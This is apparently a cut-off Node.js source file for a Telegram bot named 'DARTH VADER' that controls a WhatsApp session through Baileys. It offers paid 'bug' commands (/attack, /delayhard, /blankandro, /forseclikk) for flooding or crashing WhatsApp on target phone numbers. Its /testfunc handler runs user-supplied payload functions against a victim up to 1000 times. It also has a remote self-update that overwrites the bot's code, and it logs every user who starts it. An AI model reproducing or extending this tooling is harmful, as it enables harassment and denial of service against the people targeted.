const { Telegraf, Markup, session } = require("telegraf"); 
const fs = require("fs");
const path = require("path");
const moment = require("moment-timezone");
const vm = require('vm');
const {
  makeWASocket,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  useMultiFileAuthState,
  DisconnectReason,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  proto,
  areJidsSameUser,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const chalk = require("chalk");
const axios = require("axios");
const readline = require('readline');
const { BOT_TOKEN, OWNER_IDS } = require("./config.js");
const crypto = require("crypto");
const sessionPath = './session';
let bots = [];
const bot = new Telegraf(BOT_TOKEN);
const userBugSelection = new Map();
const attackConfig = new Map();
const multiBugSession = new Map();
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
// === Path File ===
const premiumFile = "./Dilz/premiums.json";
const adminFile = "./Dilz/admins.json";

// === Fungsi Load & Save JSON ===
const loadJSON = (filePath) => {
  try {
    const data = fs.readFileSync(filePath);
    return JSON.parse(data);
  } catch (err) {
    console.error(chalk.red(`Gagal memuat file ${filePath}:`), err);
    return [];
  }
};

// === 👤 DATA USER YANG START ===
let userStart = [];
const userFile = './user_start.json';

// Load data lama
if (fs.existsSync(userFile)) {
  userStart = JSON.parse(fs.readFileSync(userFile));
}

const userSet = new Set(userStart.map(u => u.id));


const saveJSON = (filePath, data) => {
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
};

// === Load Semua Data Saat Startup ===
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

// === Middleware Role ===
const checkOwner = (ctx, next) => {
  const userId = ctx.from.id.toString(); 
  if (!OWNER_IDS.includes(userId)) {
    return ctx.reply("❗Mohon Maaf Fitur Ini Khusus Owner");
  }

  return next();
};

const checkAdmin = (ctx, next) => {
  if (!adminUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Admin.");
  }
  next();
};

const checkPremium = (ctx, next) => {
  if (!premiumUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Premium.");
  }
  next();
};

// === Fungsi Admin / Premium ===
const addadmin = (userId) => {
  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);
  }
};

const removeAdmin = (userId) => {
  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);
};

const addpremium = (userId) => {
  if (!premiumUsers.includes(userId)) {
    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);
  }
};

const removePremium = (userId) => {
  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);
};
bot.use(session());

let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
const usePairingCode = true;
///////// RANDOM IMAGE JIR \\\\\\\
const randomImages = [
"https://files.catbox.moe/yfwfq2.png",
];

const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);

  return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });

function startBot() {
  console.clear();
  console.log(chalk.bold.yellow(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
██████╗ ██╗██╗     ███████╗
██╔ ═██╗██║██║     ╚══███╔╝
██║  ██║██║██║          ███╔╝ 
██║  ██║██║██║        ███╔╝  
██████╔╝██║███████╗███████╗
╚═════╝ ╚═╝╚══════╝╚══════╝
      `));
  console.log(
    chalk.bold.green(`
© DARTH VADER
`));
}

startBot();

// WhatsApp Connection
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState('./session');
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ['Mac OS', 'Safari', '10.15.7'],
    getMessage: async (key) => ({
      conversation: 'P', // Placeholder default
    }),
  };

  sock = makeWASocket(connectionOptions);
  sock.ev.on('creds.update', saveCreds);
  store.bind(sock.ev);

  sock.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'open') {
      sock.newsletterFollow("120363404343696075@newsletter");
      isWhatsAppConnected = true;
      console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Berhasil Tersambung')}
╰─────────────────────────────╯`));
    }

    if (connection === 'close') {
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Whatsapp Terputus')}
╰─────────────────────────────╯`));

      if (shouldReconnect) {
        console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Menyambung kembali...')}
╰─────────────────────────────╯`));
        startSesi();
      }

      isWhatsAppConnected = false;
    }
  });
};

const checkWhatsAppConnection = (ctx, next) => {
if (!isWhatsAppConnected) {
ctx.reply(`
❌ WhatsApp Belum terhubung
`);
return;
}
next();
};

const thumbnailUrl = "https://files.catbox.moe/2bzw5d.mp4";

bot.command('update', async (ctx) => {
    const OWNER_ID = 7744011281; // GANTI ID KAMU
    if (ctx.from.id !== OWNER_ID) return;

    // Link Raw GitHub kamu
    const URL_GITHUB = '';
    
    // NAMA FILE YANG ADA DI PANEL (WAJIB SAMA DENGAN FILE UTAMA BOT)
    const NAMA_FILE_BOT = 'index.js'; 
    const PATH_TUJUAN = path.join(__dirname, NAMA_FILE_BOT);

    try {
        await ctx.reply('🔄 Mendownload update permanen...');

        const response = await axios({
            method: 'get',
            url: URL_GITHUB,
            responseType: 'arraybuffer' 
        });

        fs.writeFileSync(PATH_TUJUAN, response.data);

        await ctx.reply('✅ Update Selesai! File telah diperbarui di Panel.');
        await ctx.reply('Bot akan restart otomatis untuk menjalankan kode terbaru...');

            setTimeout(() => {
            process.exit(0);
        }, 2000);

    } catch (error) {
        console.error(error);
        ctx.reply('❌ Gagal Update: ' + error.message);
    }
});

const delay = (ms) => new Promise(res => setTimeout(res, ms));
        const slowDelay = () => delay(Math.floor(Math.random() * 300) + 400);
// --- TARUH INI DI ATAS ---
const colors = ['Primary', 'Danger', 'Default', 'Success'];

function getRandomColor() {
    return colors[Math.floor(Math.random() * colors.length)];
}

function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}
// --- SAMPAI SINI ---


// --- COMMAND /start

bot.start(async (ctx) => {

  // === 👇 TAMBAHIN INI BUAT SIMPAN DATA USER 👇 ===
  const senderId = ctx.from.id;
  const namaUser = ctx.from.first_name || "Tidak ada nama";
  const username = ctx.from.username ? `@${ctx.from.username}` : "Tidak ada username";
  const waktuMulai = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

  // Cek kalau belum ada
  if (!userSet.has(senderId)) {
    const dataUser = {
      id: senderId,
      nama: namaUser,
      username: username,
      mulai: waktuMulai
    };

    userStart.push(dataUser);
    userSet.add(senderId);
    fs.writeFileSync(userFile, JSON.stringify(userStart, null, 2));
    console.log(`✅ User BARU: ${namaUser} | ${waktuMulai}`);
  }
  // === 👆 SAMPAI SINI AJA 👆 ===


  // === KODE AWAL KAMU TETEP SAMA ===
const pesanAwal = `
<blockquote><strong>🎨 PILIH WARNA</strong></blockquote>
Silakan pilih warna tombol di bawah:
`;

const tombolWarna = [
  [
    { text: "🔴 MERAH", callback_data: "warna_merah" },
    { text: "🔵 BIRU", callback_data: "warna_biru" },
    { text: "🟢 HIJAU", callback_data: "warna_hijau" }
  ],
  [
    { text: "⚪ ABU-ABU", callback_data: "warna_abu" },
    { text: "SEMUA WARNA", callback_data: "warna_semua" } // ✅ DIPERBAIKI
  ]
];

await ctx.replyWithPhoto(getRandomImage(), {
  caption: pesanAwal,
  parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: tombolWarna,
  }
});
});



bot.action(/^warna_(.*)/, async (ctx) => {
  const pilih = ctx.match[1];
  let warnaUtama;

  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waStatus = sock && sock.user
    ? "✅ Terhubung"
    : "❌ Tidak Terhubung";

  // Simpan pilihan
  userColor[userId] = pilih;

  let tombolMenu;

  if(pilih == 'semua') {
    // ✅ BEDA TOMBOL BEDA WARNA
    tombolMenu = [
      [
        { text: "XBUGS", callback_data: "bug_menu", style: 'Danger' },     // 🔴 MERAH
        { text: "XTOOLS", callback_data: "tools_menu", style: 'Success' } // 🟢 HIJAU
      ],
      [
        { text: "CUSTOM BUG", callback_data: "bug_custom", style: 'Default' }, // ⚪ ABU
        { text: "ALL MENU", callback_data: "all_menu", style: 'Primary' }      // 🔵 BIRU
      ],
      [
        { text: "SETTINGS", callback_data: "owner_menu", style: 'Danger' }    // 🔴 MERAH
      ],
      [
        { text: "DEVELOPERS", url: "https://t.me/dickxmod", style: 'Success' } // 🟢 HIJAU
      ],
      [
        { text: "🔙 GANTI WARNA", callback_data: "back_pilih_warna" } // ✅ PASTIKAN INI BENAR
      ]
    ];
  } else {
    // ✅ WARNA BIASA (SEMUA SAMA)
    if(pilih == 'merah') warnaUtama = 'Danger';
    if(pilih == 'biru') warnaUtama = 'Primary';
    if(pilih == 'hijau') warnaUtama = 'Success';
    if(pilih == 'abu') warnaUtama = 'Default';
    
    tombolMenu = [
      [
        { text: "XBUGS", callback_data: "bug_menu", style: warnaUtama },
        { text: "XTOOLS", callback_data: "tools_menu", style: warnaUtama }
      ],
      [
        { text: "CUSTOM BUG", callback_data: "bug_custom", style: warnaUtama },
        { text: "ALL MENU", callback_data: "all_menu", style: warnaUtama }
      ],
      [
        { text: "SETTINGS", callback_data: "owner_menu", style: warnaUtama } 
      ],
      [
        { text: "DEVELOPERS", url: "https://t.me/dickxmod", style: warnaUtama } 
      ],
      [
        { text: "🔙 GANTI WARNA", callback_data: "back_pilih_warna" } // ✅ PASTIKAN INI BENAR
      ]
    ];
  }

  const pesanLengkap = `
<blockquote><strong> DARTH VADER</strong></blockquote>
⎔ Developer: @dickxmod
⎔ Version: 1.0 Private Series   
⎔ Platfrom: Telegram
⎔ Type Script: Special Edition 
<blockquote><strong>𝐈𝐍𝐅𝐎𝐌𝐀𝐓𝐈𝐎𝐍</strong></blockquote>
⎔ Id: ${userId}
⎔ Username: ${Name}
<blockquote><strong>𝐒𝐄𝐍𝐃𝐄𝐑 𝐒𝐓𝐀𝐓𝐔𝐒</strong></blockquote>
⎔ Connect: ${waStatus}
`;

  await ctx.editMessageMedia({
    type: "photo",
    media: getRandomImage(),
    caption: pesanLengkap,
    parse_mode: "HTML"
  }, {
    reply_markup: {
      inline_keyboard: tombolMenu
    }
  });
});


// --- TAMBAHKAN INI JIKA BELUM ADA ---
bot.action("back_pilih_warna", async (ctx) => {
  const pesanAwal = `
<blockquote><strong>🎨 PILIH WARNA</strong></blockquote>
Silakan pilih warna tombol di bawah:
`;

  const tombolWarna = [
    [
      { text: "🔴 MERAH", callback_data: "warna_merah" },
      { text: "🔵 BIRU", callback_data: "warna_biru" },
      { text: "🟢 HIJAU", callback_data: "warna_hijau" }
    ],
    [
      { text: "⚪ ABU-ABU", callback_data: "warna_abu" },
      { text: "SEMUA WARNA", callback_data: "warna_semua" }
    ]
  ];

  await ctx.editMessageMedia({
    type: "photo",
    media: getRandomImage(),
    caption: pesanAwal,
    parse_mode: "HTML"
  }, {
    reply_markup: {
      inline_keyboard: tombolWarna
    }
  });
});

// Handler untuk owner_menu
bot.action("owner_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const waStatus = sock && sock.user
    ? "✅ Terhubung"
    : "❌ Tidak Terhubung";
        
  const mainMenuMessage = `
<blockquote><strong> DARTH VADER</strong></blockquote>
⎔ Developer: @dickxmod
⎔ Version: 1.0 Private Series   
⎔ Platfrom: Telegram
⎔ Type Script: Special Edition 
<blockquote><strong>𝐈𝐍𝐅𝐎𝐌𝐀𝐓𝐈𝐎𝐍</strong></blockquote>
⎔ Id: ${userId}
⎔ Username: ${Name}
<blockquote><strong>𝐒𝐄𝐍𝐃𝐄𝐑 𝐒𝐓𝐀𝐓𝐔𝐒</strong></blockquote>
⎔ Connect: ${waStatus}
<blockquote><strong>𝐂⦿𝐍𝐓𝐑𝐎𝐋</strong></blockquote>
• /addadmin
• /deladmin
• /Status
• /addsender
• /delsesi
• /addprem 
• /delprem 
• /cekprem
<blockquote><strong>DARTH VADER</strong></blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "📋 CEK USER", callback_data: 'cek_user' }],
        [{ text: "🔙 BACK", callback_data: 'back' }]
      ]
    } // ⬅️ TAMBAHIN `}` INI BUAT NUTUP reply_markup
  }; // ⬅️ TAMBAHIN `}` INI BUAT NUTUP keyboard

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard.reply_markup });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard.reply_markup,
    });
  }
});

bot.action("tools_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waStatus = sock && sock.user
    ? "✅ Terhubung"
    : "❌ Tidak Terhubung";

  // Ambil warna yang dipilih user
  const pilih = userColor[userId] || 'hijau'; 
  let warnaUtama;

  if(pilih == 'merah') warnaUtama = 'Danger';
  else if(pilih == 'biru') warnaUtama = 'Primary';
  else if(pilih == 'hijau') warnaUtama = 'Success';
  else if(pilih == 'abu') warnaUtama = 'Default';

  const toolsMessage = `
<blockquote><strong> DARTH VADER</strong></blockquote>
⎔ Developer: @dickxmod
⎔ Version: 1.0 Private Series   
⎔ Platfrom: Telegram
⎔ Type Script: Special Edition 
<blockquote><strong>𝐈𝐍𝐅𝐎𝐌𝐀𝐓𝐈𝐎𝐍</strong></blockquote>
⎔ Id: ${userId}
⎔ Username: ${Name}
<blockquote><strong>𝐒𝐄𝐍𝐃𝐄𝐑 𝐒𝐓𝐀𝐓𝐔𝐒</strong></blockquote>
⎔ Connect: ${waStatus}
<blockquote><strong>𝐓⦿𝐎𝐋𝐒</strong></blockquote>
• /testfunc
<blockquote><strong>DARTH VADER</strong></blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: toolsMessage,
    parse_mode: "HTML"
  };

  const toolsKeyboard = [
    [
      { text: "🔙 Kembali", callback_data: "back" }
    ]
  ];

  try {
    await ctx.editMessageMedia(media, { 
      reply_markup: { 
        inline_keyboard: toolsKeyboard 
      } 
    });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: { inline_keyboard: toolsKeyboard },
    });
  }
});

bot.action("all_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
      const waStatus = sock && sock.user
      ? "✅ Terhubung"
      : "❌ Tidak Terhubung";
      
      const mainMenuMessage = `
<blockquote><strong> DARTH VADER</strong></blockquote>
⎔ Developer: @dickxmod
⎔ Version: 1.0 Private Series   
⎔ Platfrom: Telegram
⎔ Type Script: Special Edition 
<blockquote><strong>𝐈𝐍𝐅𝐎𝐌𝐀𝐓𝐈𝐎𝐍</strong></blockquote>
⎔ Id: ${userId}
⎔ Username: ${Name}
<blockquote><strong>𝐒𝐄𝐍𝐃𝐄𝐑 𝐒𝐓𝐀𝐓𝐔𝐒</strong></blockquote>
⎔ Connect: ${waStatus}
<blockquote><strong>𝐂⦿𝐍𝐓𝐑𝐎𝐋</strong></blockquote>
• /addadmin
• /deladmin
• /Status
• /addsender
• /delsesi
• /addprem 
• /delprem 
• /cekprem
<blockquote><strong>𝐓⦿𝐎𝐋𝐒</strong></blockquote>
• /testfunc
<blockquote><strong>𝐂𝐔𝐒𝐓⦿𝐌 𝐁𝐔𝐆</strong></blockquote>
☇ - /custombug1 ᝄ 628xx ( Custom Bug New V1 )
☇ - /custombug2 ᝄ 628xx ( Custom Bug New V2 )
<blockquote><strong>𝐒𝐏𝐄𝐂𝐈𝐀𝐋 𝐁𝐔𝐆</strong></blockquote>
☇ - /attack ᝄ 628xx ( Select Button Bug )
<blockquote><strong>𝐀𝐍𝐃𝐑𝐎 𝐁𝐔𝐆𝐒</strong></blockquote>
☇ - /delayhard ᝄ 628xx ( Delay  )
☇ - /blankandro ᝄ 628xx ( Blank )
☇ - /forseclikk ᝄ 628xx ( Force Click )
<blockquote><strong>DARTH VADER</strong></blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "𝐁͢𝐀͠𝐂᷼𝐊⍣ 🔙", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
}); 

let currentPage = 1;
const perPage = 10; // Jumlah user per halaman

// Fungsi buat bikin teks daftar user
function getText(page) {
  const start = (page - 1) * perPage;
  const end = start + perPage;
  const usersPage = userStart.slice(start, end);
  const totalPages = Math.ceil(userStart.length / perPage);

  let text = `📋 **DAFTAR USER**
📊 Total: ${userStart.length} orang\n\n`;

  usersPage.forEach((user, index) => {
    text += `${start + index + 1}. <b>${user.nama}</b>
🆔 <code>${user.id}</code>
🔗 ${user.username ? `${user.username}` : 'Tidak ada username'}
⏰ ${user.mulai}\n\n`;
  });

  text += `🔹 Halaman ${page} / ${totalPages}`;
  return text;
}

// Fungsi buat bikin tombol navigasi
function getButtons(page) {
  const totalPages = Math.ceil(userStart.length / perPage);
  const buttons = [];
  
  if (totalPages > 1) {
    const row = [];
    if (page > 1) row.push({ text: '⬅️ Sebelumnya', callback_data: `prev_${page}` });
    if (page < totalPages) row.push({ text: 'Berikutnya ➡️', callback_data: `next_${page}` });
    buttons.push(row);
  }
  
  buttons.push([{ text: "🔙 Kembali", callback_data: 'owner_menu' }]);
  return { inline_keyboard: buttons };
}

// Handler tombol CEK USER
bot.action('cek_user', async (ctx) => {
  if (!OWNER_IDS.includes(String(ctx.from.id))) {
    return ctx.reply("❌ Akses ditolak!");
  }

  if (userStart.length === 0) {
    return ctx.reply("📭 Belum ada user.");
  }

  currentPage = 1; // Reset ke halaman 1 setiap buka

  await ctx.reply(getText(currentPage), {
    parse_mode: "HTML",
    reply_markup: getButtons(currentPage)
  });
});

// Handler BERIKUTNYA
bot.action(/next_(\d+)/, async (ctx) => {
  if (!OWNER_IDS.includes(String(ctx.from.id))) {
    return ctx.answerCbQuery("❌ Akses ditolak!");
  }

  const page = parseInt(ctx.match[1]);
  const totalPages = Math.ceil(userStart.length / perPage);

  if (page < totalPages) {
    currentPage = page + 1;
    await ctx.editMessageText(getText(currentPage), {
      parse_mode: "HTML",
      reply_markup: getButtons(currentPage)
    });
  }
  ctx.answerCbQuery();
});

// Handler SEBELUMNYA
bot.action(/prev_(\d+)/, async (ctx) => {
  if (!OWNER_IDS.includes(String(ctx.from.id))) {
    return ctx.answerCbQuery("❌ Akses ditolak!");
  }

  const page = parseInt(ctx.match[1]);

  if (page > 1) {
    currentPage = page - 1;
    await ctx.editMessageText(getText(currentPage), {
      parse_mode: "HTML",
      reply_markup: getButtons(currentPage)
    });
  }
  ctx.answerCbQuery();
});

bot.action("bug_custom", async (ctx) => {
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();   
      const waStatus = sock && sock.user
      ? "✅ Terhubung"
      : "❌ Tidak Terhubung";
        
  const mainMenuMessage = `
<blockquote><strong> DARTH VADER</strong></blockquote>
⎔ Developer: @dickxmod
⎔ Version: 1.0 Private Series   
⎔ Platfrom: Telegram
⎔ Type Script: Special Edition 
<blockquote><strong>𝐈𝐍𝐅𝐎𝐌𝐀𝐓𝐈𝐎𝐍</strong></blockquote>
⎔ Id: ${userId}
⎔ Username: ${Name}
<blockquote><strong>𝐒𝐄𝐍𝐃𝐄𝐑 𝐒𝐓𝐀𝐓𝐔𝐒</strong></blockquote>
⎔ Connect: ${waStatus}
<blockquote><strong>𝐂𝐔𝐒𝐓⦿𝐌 𝐁𝐔𝐆</strong></blockquote>
☇ - /custombug1 ᝄ 628xx ( Custom Bug New V1 )
☇ - /custombug2 ᝄ 628xx ( Custom Bug New V2 )
<blockquote><strong>DARTH VADER</strong></blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      // === TOMBOL CUSTOM BUG ===
      [
        //{ text: "⚡ CUSTOM BUG V1", callback_data: "open_custom1" },
        //{ text: "⚡ CUSTOM BUG V2", callback_data: "open_custom2" }
      ],
      // === TOMBOL BACK ===
      [{ text: "𝐁͢𝐀͠𝐂᷼𝐊⍣ 🔙", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});

bot.action("bug_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
      const waStatus = sock && sock.user
      ? "✅ Terhubung"
      : "❌ Tidak Terhubung";
      
  const mainMenuMessage = `
<blockquote><strong> DARTH VADER</strong></blockquote>
⎔ Developer: @dickxmod
⎔ Version: 1.0 Private Series   
⎔ Platfrom: Telegram
⎔ Type Script: Special Edition 
<blockquote><strong>𝐈𝐍𝐅𝐎𝐌𝐀𝐓𝐈𝐎𝐍</strong></blockquote>
⎔ Id: ${userId}
⎔ Username: ${Name}
<blockquote><strong>𝐒𝐄𝐍𝐃𝐄𝐑 𝐒𝐓𝐀𝐓𝐔𝐒</strong></blockquote>
⎔ Connect: ${waStatus}
<blockquote><strong>𝐒𝐏𝐄𝐂𝐈𝐀𝐋 𝐁𝐔𝐆</strong></blockquote>
☇ - /attack ᝄ 628xx ( Select Button Bug )
<blockquote><strong>𝐀𝐍𝐃𝐑𝐎 𝐁𝐔𝐆𝐒</strong></blockquote>
☇ - /delayhard ᝄ 628xx ( Delay  )
☇ - /blankandro ᝄ 628xx ( Blank )
☇ - /forseclikk ᝄ 628xx ( Force Click )
<blockquote><strong>DARTH VADER</strong></blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "𝐁͢𝐀͠𝐂᷼𝐊⍣ 🔙", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});

// Variabel buat nyimpen warna user
let userColor = {}; 

function getRandomColor() {
    return colors[Math.floor(Math.random() * colors.length)];
}

function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}

bot.action("back", async (ctx) => {
  const userId = ctx.from.id;
  const pilih = userColor[userId] || 'hijau'; 
  let warnaUtama;

  const userIdStr = userId.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : userIdStr;
  const waStatus = sock && sock.user
    ? "✅ Terhubung"
    : "❌ Tidak Terhubung";
      
  const mainMenuMessage = `
<blockquote><strong> DARTH VADER</strong></blockquote>
⎔ Developer: @dickxmod
⎔ Version: 1.0 Private Series   
⎔ Platfrom: Telegram
⎔ Type Script: Special Edition 
<blockquote><strong>𝐈𝐍𝐅𝐎𝐌𝐀𝐓𝐈𝐎𝐍</strong></blockquote>
⎔ Id: ${userIdStr}
⎔ Username: ${Name}
<blockquote><strong>𝐒𝐄𝐍𝐃𝐄𝐑 𝐒𝐓𝐀𝐓𝐔𝐒</strong></blockquote>
⎔ Connect: ${waStatus}
`;

const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  let mainKeyboard;

  // ✅ KALAU PILIH "SEMUA WARNA" => BEDA TOMBOL BEDA WARNA
  if(pilih == 'semua') {
    mainKeyboard = [
      [
        { text: "XBUGS", callback_data: "bug_menu", style: 'Danger' },     // 🔴 MERAH
        { text: "XTOOLS", callback_data: "tools_menu", style: 'Success' } // 🟢 HIJAU
      ],
      [
        { text: "CUSTOM BUG", callback_data: "bug_custom", style: 'Default' }, // ⚪ ABU
        { text: "ALL MENU", callback_data: "all_menu", style: 'Primary' }      // 🔵 BIRU
      ],
      [
        { text: "SETTINGS", callback_data: "owner_menu", style: 'Danger' }    // 🔴 MERAH
      ],
      [
        { text: "DEVELOPERS", url: "https://t.me/dickxmod", style: 'Success' } // 🟢 HIJAU
      ],
      [
        { text: "🔙 GANTI WARNA", callback_data: "back_pilih_warna" } 
      ]
    ];
  } else {
    // ✅ KALAU PILIH WARNA BIASA => SEMUA TOMBOL WARNA SAMA
    if(pilih == 'merah') warnaUtama = 'Danger';
    else if(pilih == 'biru') warnaUtama = 'Primary';
    else if(pilih == 'hijau') warnaUtama = 'Success';
    else if(pilih == 'abu') warnaUtama = 'Default';

    mainKeyboard = [
      [
        { text: "XBUGS", callback_data: "bug_menu", style: warnaUtama },
        { text: "XTOOLS", callback_data: "tools_menu", style: warnaUtama }
      ],
      [
        { text: "CUSTOM BUG", callback_data: "bug_custom", style: warnaUtama },
        { text: "ALL MENU", callback_data: "all_menu", style: warnaUtama }
      ],
      [
        { text: "SETTINGS", callback_data: "owner_menu", style: warnaUtama } 
      ],
      [
        { text: "DEVELOPERS", url: "https://t.me/dickxmod", style: warnaUtama } 
      ],
      [
        { text: "🔙 GANTI WARNA", callback_data: "back_pilih_warna" } 
      ]
    ];
  }
  
  try {
    await ctx.editMessageMedia(media, { reply_markup: { inline_keyboard: mainKeyboard } });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: { inline_keyboard: mainKeyboard },
    });
  }
});

// CUSTOMBUG 3
// ===== COMMAND =====
bot.hears(/^\/testfunc(?:@[\w_]+)?\s*(.*)/, checkWhatsAppConnection, checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;

  try {
    const args = ctx.text.split(" ");
    if (args.length < 3) {
      return ctx.reply("🪧 Example : /testfunc 62××× 10 (reply function)");
    }

    const q = args[1];
    let jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000));
    if (isNaN(jumlah) || jumlah <= 0) {
      return ctx.reply("❌ Jumlah harus angka");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    if (!ctx.message.reply_to_message) {
      return ctx.reply("❌ Reply dengan function");
    }

    const processMsg = await ctx.replyWithPhoto(thumbnailUrl, {
      caption:
        `<blockquote><pre>⬡═―—⊱ ⎧ DARTH VADER ⎭ ⊰―—═⬡</pre></blockquote>
▢ Target: ${q}
▢ Type: Unknown Func
▢ Status: Process Bug
╘═——————————————═⬡`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "! Check", url: `https://wa.me/${q}` }]
        ]
      }
    });

    const processMessageId = processMsg.message_id;

    // === PERBAIKAN DISINI ===
    const safeSock = sock; // Pakai sock langsung
    const funcCode = ctx.message.reply_to_message.text;

    const matchFunc = funcCode.match(/async function\s+(\w+)/);
    if (!matchFunc) return ctx.reply("❌ Function tidak valid");

    const funcName = matchFunc[1];

    const sandbox = {
      console,
      Buffer,
      sock: safeSock,
      target,
      sleep,
      generateWAMessageFromContent,
      generateForwardMessageContent,
      generateWAMessage,
      prepareWAMessageMedia,
      proto,
      jidDecode,
      areJidsSameUser,
      setTimeout,
      clearTimeout,
      crypto: require('crypto')
    };

    const vm = require("vm");
    const context = vm.createContext(sandbox);

    const wrapper = `${funcCode}\n${funcName};`;
    const fn = vm.runInContext(wrapper, context);

    let successCount = 0;
    let errorCount = 0;
    let errorSent = false;
    let lastError = "";

    for (let i = 0; i < jumlah; i++) {
      try {
        const arity = fn.length;
        if (arity === 1) {
          await fn(target);
        } else if (arity === 2) {
          await fn(safeSock, target);
        } else {
          await fn(safeSock, target, true);
        }
        successCount++;
      } catch (e) {
        errorCount++;
        lastError = e.message;
        console.error(`Error di loop ${i+1}:`, e.message);

        if (!errorSent) {
          errorSent = true;
          await ctx.reply(`❌ Error di loop ${i+1}:\n${e.message}`).catch(()=>{});
        }
      }
      await sleep(200);
    }

    const finalText =
